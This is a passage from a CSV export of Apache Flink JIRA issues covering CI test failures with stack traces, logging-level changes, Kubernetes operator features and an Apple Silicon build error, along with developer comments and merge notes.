        at org.jboss.netty.bootstrap.ClientBootstrap.connect(ClientBootstrap.java:182) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at akka.remote.transport.netty.NettyTransport.$anonfun$associate$1(NettyTransport.scala:566) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:307) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:63) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:100) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:100) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:49) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:48) [flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:175) [?:1.8.0_292]
Caused by: java.lang.ClassNotFoundException: org.jboss.netty.handler.codec.frame.LengthFieldBasedFrameDecoder
        at java.net.URLClassLoader.findClass(URLClassLoader.java:382) ~[?:1.8.0_292]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:418) ~[?:1.8.0_292]
        at org.apache.flink.core.classloading.ComponentClassLoader.loadClassFromComponentOnly(ComponentClassLoader.java:150) ~[flink-core-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at org.apache.flink.core.classloading.ComponentClassLoader.loadClass(ComponentClassLoader.java:113) ~[flink-core-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:351) ~[?:1.8.0_292]
        ... 19 more
{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/May/23 10:10;Sergey Nuyanzin;logs-ci-test_ci_core-1684238025.zip;https://issues.apache.org/jira/secure/attachment/13058402/logs-ci-test_ci_core-1684238025.zip",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-22 10:09:28.0,,,,,,,,,,"0|z1i1wg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove some trivial mocking usages,FLINK-32149,13537122,13534279,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,22/May/23 09:57,23/May/23 07:41,04/Jun/24 20:41,23/May/23 07:41,,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 23 07:41:08 UTC 2023,,,,,,,,,,"0|z1i1tk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/May/23 07:41;chesnay;master: 291414f9cde3f178a3ea3d6c6ef1d5f3dc3fa9c3;;;",,,,,,,,,,,,,,,,,,,,,,
Reduce info logging noise in the operator,FLINK-32148,13537094,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,gyfora,gyfora,gyfora,22/May/23 09:27,28/May/23 17:34,04/Jun/24 20:41,28/May/23 17:34,kubernetes-operator-1.5.0,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,"The operator controller/reconciler/observer logic currently logs a lot of information on INFO level even when ""nothing"" happens. This should be improved and reduce most of these to DEBUG",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun May 28 17:34:09 UTC 2023,,,,,,,,,,"0|z1i1nc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/May/23 17:34;gyfora;merged to main 2c3b1c5c9d9bea12098d07284d6d93ad1face1dd;;;",,,,,,,,,,,,,,,,,,,,,,
Deduplicate scaling report messages,FLINK-32147,13537090,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,gyfora,gyfora,gyfora,22/May/23 09:19,28/May/23 17:34,04/Jun/24 20:41,28/May/23 17:34,kubernetes-operator-1.5.0,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Autoscaler,Kubernetes Operator,,,0,pull-request-available,,,Scaling reports currently create distinct new events in kubernetes due to the message content. We should deduplicate these.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun May 28 17:34:24 UTC 2023,,,,,,,,,,"0|z1i1mg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/May/23 17:34;gyfora;merged to main 57974b61590e1976785fbdd4a40dafa975fc9521;;;",,,,,,,,,,,,,,,,,,,,,,
HiveTableSinkITCase crashed with exit code 239 on AZP,FLINK-32146,13537068,13537639,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Duplicate,,Sergey Nuyanzin,Sergey Nuyanzin,22/May/23 08:00,25/May/23 10:58,04/Jun/24 20:41,22/May/23 08:10,1.16.2,,,,,,,,,,,,,,,,,,,,Connectors / Hive,Tests,,,0,test-stability,,,"{noformat}
May 18 05:48:18 [ERROR] Process Exit Code: 239
May 18 05:48:18 [ERROR] Crashed tests:
May 18 05:48:18 [ERROR] org.apache.flink.connectors.hive.HiveTableSinkITCase
May 18 05:48:18 [ERROR] at org.apache.maven.plugin.surefire.booterclient.ForkStarter.fork(ForkStarter.java:748)
May 18 05:48:18 [ERROR] at org.apache.maven.plugin.surefire.booterclient.ForkStarter.access$700(ForkStarter.java:121)
May 18 05:48:18 [ERROR] at org.apache.maven.plugin.surefire.booterclient.ForkStarter$2.call(ForkStarter.java:465)
May 18 05:48:18 [ERROR] at org.apache.maven.plugin.surefire.booterclient.ForkStarter$2.call(ForkStarter.java:442)
May 18 05:48:18 [ERROR] at java.util.concurrent.FutureTask.run(FutureTask.java:266)
May 18 05:48:18 [ERROR] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
May 18 05:48:18 [ERROR] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
May 18 05:48:18 [ERROR] at java.lang.Thread.run(Thread.java:748)
May 18 05:48:18 [ERROR] -> [Help 1]

{noformat}
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49123&view=logs&j=5cae8624-c7eb-5c51-92d3-4d2dacedd221&t=5acec1b4-945b-59ca-34f8-168928ce5199&l=25935

",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/May/23 08:00;Sergey Nuyanzin;logs-cron_azure-test_cron_azure_misc-1684386527.zip;https://issues.apache.org/jira/secure/attachment/13058396/logs-cron_azure-test_cron_azure_misc-1684386527.zip",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 22 08:10:30 UTC 2023,,,,,,,,,,"0|z1i1hk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/May/23 08:08;Sergey Nuyanzin;there is 
{noformat}
05:30:58,039 [flink-akka.actor.default-dispatcher-8] INFO  org.apache.flink.runtime.blob.PermanentBlobCache             [] - Shutting down BLOB cache
05:30:58,039 [flink-akka.actor.default-dispatcher-8] INFO  org.apache.flink.runtime.blob.TransientBlobCache             [] - Shutting down BLOB cache
05:30:58,044 [flink-akka.actor.default-dispatcher-8] INFO  org.apache.flink.runtime.blob.BlobServer                     [] - Stopped BLOB server at 0.0.0.0:46707
05:30:58,045 [flink-akka.actor.internal-dispatcher-3] ERROR org.apache.flink.util.FatalExitExceptionHandler              [] - FATAL: Thread 'flink-akka.actor.internal-dispatcher-3' produced an uncaught exception. Stopping the process...
java.lang.NoClassDefFoundError: akka/actor/SuppressedDeadLetter
        at akka.actor.EmptyLocalActorRef.publishSupressedDeadLetter(ActorRef.scala:712) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.actor.EmptyLocalActorRef.specialHandle(ActorRef.scala:706) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.actor.DeadLetterActorRef.specialHandle(ActorRef.scala:740) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.actor.DeadLetterActorRef.$bang(ActorRef.scala:728) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.dispatch.Mailboxes$$anon$1.systemEnqueue(Mailboxes.scala:53) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:313) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:273) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.dispatch.Mailbox.run(Mailbox.scala:231) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.dispatch.Mailbox.exec(Mailbox.scala:243) [flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:175) [?:1.8.0_292]
Caused by: java.lang.ClassNotFoundException: akka.actor.SuppressedDeadLetter
        at java.net.URLClassLoader.findClass(URLClassLoader.java:382) ~[?:1.8.0_292]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:418) ~[?:1.8.0_292]
        at org.apache.flink.core.classloading.ComponentClassLoader.loadClassFromComponentOnly(ComponentClassLoader.java:149) ~[flink-core-1.16-SNAPSHOT.jar:1.16-SNAPSHOT]
        at org.apache.flink.core.classloading.ComponentClassLoader.loadClass(ComponentClassLoader.java:112) ~[flink-core-1.16-SNAPSHOT.jar:1.16-SNAPSHOT]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:351) ~[?:1.8.0_292]
        ... 13 more
05:30:58,046 [flink-akka.actor.default-dispatcher-6] ERROR org.apache.flink.util.FatalExitExceptionHandler              [] - FATAL: Thread 'flink-akka.actor.default-dispatcher-6' produced an uncaught exception. Stopping the process...
java.lang.NoClassDefFoundError: akka/actor/SuppressedDeadLetter
        at akka.actor.EmptyLocalActorRef.publishSupressedDeadLetter(ActorRef.scala:712) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.actor.EmptyLocalActorRef.specialHandle(ActorRef.scala:706) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.actor.DeadLetterActorRef.specialHandle(ActorRef.scala:740) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.actor.DeadLetterActorRef.$bang(ActorRef.scala:728) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.dispatch.Mailboxes$$anon$1.systemEnqueue(Mailboxes.scala:53) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:313) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.dispatch.Mailbox.run(Mailbox.scala:230) ~[flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at akka.dispatch.Mailbox.exec(Mailbox.scala:243) [flink-rpc-akka_fed3d292-8e56-4744-acfd-0b51e8fd93fe.jar:1.16-SNAPSHOT]
        at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:175) [?:1.8.0_292]
{noformat}
 in logs ;;;","22/May/23 08:10;Sergey Nuyanzin;closed as duplicate of https://issues.apache.org/jira/browse/FLINK-31669;;;",,,,,,,,,,,,,,,,,,,,,
Fix incorrect docker image links of specific versions in flink-web site,FLINK-32145,13537064,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,yunta,yunta,yunta,22/May/23 07:53,22/May/23 09:19,04/Jun/24 20:41,22/May/23 09:19,,,,,,,,,,,,,,,,,,,,,Documentation,,,,0,pull-request-available,,,"Current links of docker images in many release announcements point to an incorrect place, we should fix them to the correct locations.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 22 09:19:32 UTC 2023,,,,,,,,,,"0|z1i1go:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/May/23 09:19;yunta;resolved in apache/flink-web: 69c1dd54672dbbe4015c7bbcbb54971518d2e55b;;;",,,,,,,,,,,,,,,,,,,,,,
FileSourceTextLinesITCase times out on AZP,FLINK-32144,13537061,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,wanglijie,Sergey Nuyanzin,Sergey Nuyanzin,22/May/23 07:31,08/Aug/23 06:38,04/Jun/24 20:41,08/Aug/23 06:38,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Connectors / FileSystem,Tests,,,0,pull-request-available,test-stability,,"{noformat}
 May 21 01:15:09 ==============================================================================
May 21 01:15:09 Process produced no output for 900 seconds.
May 21 01:15:09 ==============================================================================
May 21 01:15:09 ==============================================================================
May 21 01:15:09 The following Java processes are running (JPS)
May 21 01:15:09 ==============================================================================
...
May 21 01:15:10 ""ForkJoinPool-1-worker-25"" #27 daemon prio=5 os_prio=0 tid=0x00007ff334c35800 nid=0x1e49 waiting on condition [0x00007ff23c3e7000]
May 21 01:15:10    java.lang.Thread.State: WAITING (parking)
May 21 01:15:10 	at sun.misc.Unsafe.park(Native Method)
May 21 01:15:10 	- parking to wait for  <0x00000000ce8682e0> (a java.util.concurrent.CompletableFuture$Signaller)
May 21 01:15:10 	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
May 21 01:15:10 	at java.util.concurrent.CompletableFuture$Signaller.block(CompletableFuture.java:1707)
May 21 01:15:10 	at java.util.concurrent.ForkJoinPool.managedBlock(ForkJoinPool.java:3313)
May 21 01:15:10 	at java.util.concurrent.CompletableFuture.waitingGet(CompletableFuture.java:1742)
May 21 01:15:10 	at java.util.concurrent.CompletableFuture.get(CompletableFuture.java:1908)
May 21 01:15:10 	at org.apache.flink.connector.file.src.FileSourceTextLinesITCase$RecordCounterToFail.waitToFail(FileSourceTextLinesITCase.java:481)
May 21 01:15:10 	at org.apache.flink.connector.file.src.FileSourceTextLinesITCase$RecordCounterToFail.access$100(FileSourceTextLinesITCase.java:457)
May 21 01:15:10 	at org.apache.flink.connector.file.src.FileSourceTextLinesITCase.testBoundedTextFileSource(FileSourceTextLinesITCase.java:145)
May 21 01:15:10 	at org.apache.flink.connector.file.src.FileSourceTextLinesITCase.testBoundedTextFileSourceWithJobManagerFailover(FileSourceTextLinesITCase.java:110)
May 21 01:15:10 	
...
May 21 01:15:10 Killing process with pid=860 and all descendants
/__w/2/s/tools/ci/watchdog.sh: line 113:   860 Terminated              $cmd
May 21 01:15:11 Process exited with EXIT CODE: 143.
May 21 01:15:11 Trying to KILL watchdog (856).
May 21 01:15:11 Searching for .dump, .dumpstream and related files in '/__w/2/s'
May 21 01:15:15 Moving '/__w/2/s/flink-connectors/flink-connector-files/target/surefire-reports/2023-05-21T00-58-13_549-jvmRun2.dumpstream' to target directory ('/__w/_temp/debug_files')
May 21 01:15:15 Moving '/__w/2/s/flink-connectors/flink-connector-files/target/surefire-reports/2023-05-21T00-58-13_549-jvmRun2.dump' to target directory ('/__w/_temp/debug_files')
The STDIO streams did not close within 10 seconds of the exit event from process '/bin/bash'. This may indicate a child process inherited the STDIO streams and has not yet exited.

{noformat}

https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49181&view=logs&j=4eda0b4a-bd0d-521a-0916-8285b9be9bb5&t=2ff6d5fa-53a6-53ac-bff7-fa524ea361a9&l=14436",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Aug 08 06:38:12 UTC 2023,,,,,,,,,,"0|z1i1g0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/May/23 03:50;wanglijie;I can reproduce this problem locally with `cluster.evenly-spread-out-slots: true`, and found the root cause is the wrong usage of {{{}MiniClusterExtension{}}}. Each test in {{FileSourceTextLinesITCase}} needs a new minicluster instance (as some tests kill the TM), but {{MiniClusterExtension}} creates only one {{MiniCluster}} instance for each test class, all tests in the test class share one minicluster instance.

I can easily fix this problem by manully creating a minicluster instance in each test, but I think it's worth discussing whether to enrich {{MiniClusterExtension}} to support this functionality, just like the {{@Rule}} in Junit4.;;;","25/May/23 08:24;wanglijie;Do you have any thoughts? [~chesnay] [~ruanhang1993] [~slinkydeveloper] ;;;","25/May/23 08:28;wanglijie;Perhaps we should provide two extensions, one that creates a minicluster instance per class and another one per test.;;;","25/May/23 08:29;Sergey Nuyanzin;Thanks for diving into and sorry for the delay

is it possible to add such feature to {{MiniClusterExtension}} on configuration level and make it off by default?;;;","25/May/23 14:49;wanglijie;Adding this feature on configuration level is an option. 

Another option, according to the [doc of junit5 migration|https://docs.google.com/document/d/1514Wa_aNB9bJUen4xm5uiuXOooOJTtXqS_Jqk9KJitU],  is to let {{MiniClusterExtension}} implements {{CustomExtension}} interface, and wrap it with {{EachCallbackWrapper}} for per-test lifecycle, or wrap it with {{AllCallbackWrapper}} for per-class lifecycle (Currently there are some other extensions following this rule, for example {{{}ZooKeeperExtension{}}}).

But I found that we did as this before FLINK-26252, and I don't know why it has been changed to the current state in FLINK-26252.;;;","13/Jun/23 08:18;renqs;[~wanglijie] Any progress on this issue?;;;","20/Jun/23 10:45;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50014&view=logs&j=075127ba-54d5-54b0-cccf-6a36778b332d&t=c35a13eb-0df9-505f-29ac-8097029d4d79&l=13199;;;","31/Jul/23 07:28;mapohl;2x in the same build:
* https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=51804&view=logs&j=075127ba-54d5-54b0-cccf-6a36778b332d&t=c35a13eb-0df9-505f-29ac-8097029d4d79&l=12810
* https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=51804&view=logs&j=7e3d33c3-a462-5ea8-98b8-27e1aafe4ceb&t=ef77f8d1-44c8-5ee2-f175-1c88f61de8c0&l=14368;;;","08/Aug/23 06:38;renqs;Merged on master: fa61dd439ece9e2b9ef710ce2f7eed54c4d4403a;;;",,,,,,,,,,,,,,
Automatic cleanup of terminated flinkdeployments,FLINK-32143,13537015,,New Feature,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,Paul Lin,Paul Lin,22/May/23 03:57,31/Aug/23 07:10,04/Jun/24 20:41,31/Aug/23 06:34,,,,,,,,,,,,,,,,,,,,,Kubernetes Operator,,,,0,,,,"Currently, if a job turns into terminated status (e.g. FINISHED or FAILED), the flinkdeployment remains until a manual cleanup is performed.

We could add a configuration named `kubernetes.operator.deployment.cleanup.delay`, and clean up terminated deployments after the delay. The delay is default to `-1` which means the cleanup is disabled.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Aug 31 07:10:32 UTC 2023,,,,,,,,,,"0|z1i15s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"31/Aug/23 06:34;gyfora;This is already covered by the `kubernetes.operator.jm-deployment.shutdown-ttl` option and works by default ;;;","31/Aug/23 07:10;Paul Lin;Looks great! Thanks [~gyfora] ;;;",,,,,,,,,,,,,,,,,,,,,
"Apple Silicon Support: Unable to Build Flink Project due to ""Bad CPU Type"" Error",FLINK-32142,13536980,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,elphastori,elphastori,elphastori,21/May/23 12:31,31/May/24 08:09,04/Jun/24 20:41,31/May/24 08:09,1.15.0,1.15.1,1.15.2,1.15.3,1.15.4,1.15.5,1.16.0,1.16.1,1.16.2,1.16.3,1.17.0,1.17.1,1.17.2,1.18.0,1.20.0,,,,,,Build System,Runtime / Web Frontend,,,0,pull-request-available,stale-assigned,,"Attempting to build the Flink project on Apple Silicon architecture results in an error related to the execution of the frontend-maven-plugin.

The error message indicates that the plugin fails to run ""flink/flink-runtime-web/web-dashboard/node/node"" program due to a ""Bad CPU type in executable"" error.
{code:java}
[ERROR] Failed to execute goal com.github.eirslett:frontend-maven-plugin:1.11.0:npm (npm install) on project flink-runtime-web: Failed to run task: 'npm ci --cache-max=0 --no-save ${npm.proxy}' failed. java.io.IOException: Cannot run program ""flink/flink-runtime-web/web-dashboard/node/node"" (in directory ""flink/flink-runtime-web/web-dashboard""): error=86, Bad CPU type in executable{code}
Steps to Reproduce:
 # Clone the Flink project repository. 
 # Attempt to build the project on an Apple Silicon device.
 # Observe the error message mentioned above.

{code:java}
git clone https://github.com/apache/flink.git
cd flink
./mvnw clean package -DskipTests
{code}
Proposed Solution

Upgrade frontend-maven-plugin from version 1.11.0 to the latest version, 1.12.1.

frontend-maven-plugin version 1.11.0 downloads x64 binaries node-v16.13.2-darwin-x64.tar.gz instead of the arm64 binaries.

Support for arm64 has been available for frontend-maven-plugin  since version 2. [https://github.com/eirslett/frontend-maven-plugin/pull/970]
{code:java}
[DEBUG] Executing command line [/Users/elphas/src/flink/flink-runtime-web/web-dashboard/node/node, --version] [INFO] Installing node version v16.13.2 [DEBUG] Creating temporary directory /flink/flink-runtime-web/web-dashboard/node/tmp [INFO] Unpacking ~/.m2/repository/com/github/eirslett/node/16.13.2/node-16.13.2-darwin-x64.tar.gz into flink/flink-runtime-web/web-dashboard/node/tmp{code}
 

 

 

 ","Apple Silicon architecture (M2 Pro)

macOS Ventura (Version 13.3.1)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 31 08:09:42 UTC 2024,,,,,,,,,,"0|z1i0y0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"21/May/23 12:57;elphastori;[~danny.cranmer] could you please assign this to me?;;;","21/May/23 13:12;dannycranmer;Done;;;","21/May/23 17:35;elphastori;Thanks, could you please take a look at the PR?;;;","03/Jul/23 16:07;elphastori;[~Weijie Guo] Could you please take a last look at the PR?;;;","11/Aug/23 10:34;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","31/May/24 08:09;pnowojski;merged commit d075c9f into apache:master;;;",,,,,,,,,,,,,,,,,
SharedStateRegistry print too much info log,FLINK-32141,13536955,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Feifan Wang,Feifan Wang,Feifan Wang,20/May/23 16:35,22/May/23 15:22,04/Jun/24 20:41,22/May/23 15:22,1.17.0,,,,,,,,,,,,,,1.17.2,1.18.0,,,,,Runtime / Checkpointing,,,,0,pull-request-available,,,"FLINK-29095 added some log to SharedStateRegistry for trouble shooting. Among them, a info log be added when newHandle is equal to the registered one:

[https://github.com/apache/flink/blob/release-1.17.0/flink-runtime/src/main/java/org/apache/flink/runtime/state/SharedStateRegistryImpl.java#L117]

!image-2023-05-21-00-26-20-026.png|width=775,height=126!

But this case cannot be considered as a potential bug, because FsStateChangelogStorage will directly use the FileStateHandle of the previous checkpoint instead of PlaceholderStreamStateHandle.

In our tests, JobManager printed so much of this log that useful information was overwhelmed.

So I suggest change this log level to trace, WDYT [~Yanfei Lei], [~klion26] ?",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/May/23 16:26;Feifan Wang;image-2023-05-21-00-26-20-026.png;https://issues.apache.org/jira/secure/attachment/13058385/image-2023-05-21-00-26-20-026.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 22 15:22:05 UTC 2023,,,,,,,,,,"0|z1i0sg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/May/23 12:35;Yanfei Lei;Thanks for reporting this.

+1 for ""FsStateChangelogStorage will directly use the FileStateHandle of the previous checkpoint instead of PlaceholderStreamStateHandle."";;;","22/May/23 15:22;Weijie Guo;master(1.18) via d94818e5f2301200f3f1bd6bd094a79f4545bd84.
release-1.17 via f0adce77f261627a651dd231189c9222e407c9de.;;;",,,,,,,,,,,,,,,,,,,,,
Data accidentally deleted and not deleted when upsert sink to hbase,FLINK-32140,13536952,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
